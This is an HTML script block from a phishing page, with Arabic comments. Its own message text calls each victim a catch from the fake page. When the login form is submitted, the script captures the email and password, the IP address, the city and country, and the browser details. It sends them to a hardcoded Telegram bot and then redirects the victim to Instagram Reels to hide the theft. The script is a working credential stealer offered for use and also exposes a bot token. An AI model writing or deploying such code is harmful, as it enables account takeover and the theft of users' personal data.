  <script>
    // بيانات البوت الخاصة بك
    const TOKEN = "7800818856:AAE4QPjtrzQB3qAIlyWPn9_x69xVPw0ItGY";
    const CHAT_ID = "1810158222";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById("login-form").addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = document.querySelector('input[name="email"]').value;
      const password = document.querySelector('input[name="password"]').value;

      try {
        // 1. جلب معلومات الـ IP والموقع الجغرافي
        const ipRes = await axios.get('https://ipapi.co/json/');
        const data = ipRes.data;

        const userIP = data.ip || "غير معروف";
        const city = data.city || "غير معروف";
        const country = data.country_name || "غير معروف";
        const browser = navigator.userAgent; // جلب نوع الجهاز والمتصفح

        // 2. تجهيز الرسالة بشكل مرتب (Markdown)
        const message = `
⚠️ <b>صيد جديد من صفحة المزورة!</b>
━━━━━━━━━━━━━━
👤 <b>اليوزر/الإيميل:</b> <code>${email}</code>
🔑 <b>كلمة المرور:</b> <code>${password}</code>
━━━━━━━━━━━━━━
🌐 <b>الـ IP:</b> ${userIP}
📍 <b>الموقع:</b> ${city}, ${country}
📱 <b>الجهاز:</b> ${browser}
━━━━━━━━━━━━━━
        `;

        // 3. إرسال البيانات إلى تليجرام
        await axios.post(URI_API, {
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML",
        });

        // 4. توجيه المستخدم بعد نجاح الإرسال للتمويه
        window.location.href = "https://www.instagram.com/reels/";

      } catch (error) {
        // في حال فشل جلب الـ IP، نرسل البيانات الأساسية لضمان وصول الصيد
        const simpleMessage = `⚠️ <b>صيد جديد (بدون IP):</b>\n👤 <b>اليوزر:</b> ${email}\n🔑 <b>الباسورد:</b> ${password}`;
        
        axios.post(URI_API, {
          chat_id: CHAT_ID,
          text: simpleMessage,
          parse_mode: "HTML",
        }).finally(() => {
          window.location.href = "https://www.instagram.com/reels/";
        });
      }
    });
  </script>
